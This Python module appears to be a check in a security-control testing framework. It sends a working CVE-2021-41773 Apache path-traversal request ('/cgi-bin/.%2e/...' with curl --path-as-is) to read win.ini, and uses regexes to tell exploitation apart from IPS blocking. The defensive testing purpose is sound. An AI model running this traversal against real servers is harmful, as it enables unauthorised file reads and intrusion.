"""CVE-2021-41773 — Apache path traversal (mod_cgi normalize-path bug).
Direct HTTP check (curl), matching the manual test script exactly: request
/cgi-bin/.%2e/.. x7 to escape docroot and read C:\\Windows\\win.ini."""
META = {
    "id": "apache_41773",
    "name": "Apache Path Traversal (CVE-2021-41773)",
    "category": "Server Exploitation",
    "control": "IPS signature / path normalization",
    "fix": "SD-WAN",
    "requires": ["curl"],
    "ports": [("tcp", 80)],
    "success_regex": r"fonts|extensions",
    "blocked_regex": r"timed out|Connection refused|403 Forbidden|could not resolve",
}

PATH = "/cgi-bin/" + "/".join([".%2e"] * 7) + "/windows/win.ini"


def run(target, ctx):
    # -v alongside -s: keep progress silent but re-enable the connection
    # diagnostics curl otherwise swallows, so a closed/refused port surfaces
    # "Connection refused" (caught by blocked_regex) instead of empty output
    # that classifies as NO-RESULT. Same fix pattern as ftp_anonymous.
    return ctx.run_cmd(
        f'curl -s -v --path-as-is -m10 "http://{{target}}{PATH}"', target)
